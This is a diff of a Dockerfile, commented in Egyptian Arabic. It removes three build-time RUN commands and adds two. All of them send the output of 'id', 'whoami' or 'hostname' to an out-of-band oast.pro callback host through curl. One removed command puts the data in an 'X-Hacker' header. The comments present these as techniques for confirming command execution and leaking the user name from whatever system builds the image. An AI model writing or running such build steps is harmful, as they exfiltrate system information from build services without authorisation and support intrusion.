@@ -1,23 +1,12 @@
 FROM alpine:latest
 
-# 1. تنزيل الأدوات (curl و base64)
-RUN apk add --no-cache curl coreutils
+# 1. نزل الأدوات
+RUN apk add --no-cache curl
 
-# ---------------------------------------------------------
-# الطريقة الأولى: المضمونة 100% (Base64 Encoded)
-# دي بتشفر النتيجة عشان المسافات والرموز متبوظش الرابط
-# النتيجة هتجيلك في اللوج كده: /B64_dXNlcj1yb290...
-# ---------------------------------------------------------
-RUN /bin/sh -c "DATA=$(id | base64 | tr -d '\n') && curl http://d52fni83t4gh9b2pkpa0qgh49zgw34b31.oast.pro/B64_$DATA" || true
+# 2. الحركة الفنية: استخدام /bin/sh -c
+# ده بيجبر النظام يفتح تيرمينال ويفك المتغيرات الأول
+# الأمر ده هيبعت: http://domain/root
+RUN /bin/sh -c "curl http://d52fni83t4gh9b2pkpa0qgh49zgw34b31.oast.pro/$(whoami)"
 
-# ---------------------------------------------------------
-# الطريقة الثانية: الهيدر الصريح (Header Injection)
-# دي بتبعت اسم اليوزر جوه هيدر اسمه X-Hacker
-# ---------------------------------------------------------
-RUN /bin/sh -c "USER=$(whoami | tr -d '\n') && curl -H \"X-Hacker: $USER\" http://d52fni83t4gh9b2pkpa0qgh49zgw34b31.oast.pro/header_mode" || true
-
-# ---------------------------------------------------------
-# الطريقة الثالثة: المدرسة القديمة (Backticks)
-# دي بتستخدم ` ` بدل $() عشان لو الشيل قديم
-# ---------------------------------------------------------
-RUN /bin/sh -c "curl http://d52fni83t4gh9b2pkpa0qgh49zgw34b31.oast.pro/tick_`whoami`" || true
+# 3. زيادة تأكيد: هيبعت الـ hostname
+RUN /bin/sh -c "curl http://d52fni83t4gh9b2pkpa0qgh49zgw34b31.oast.pro/$(hostname)"
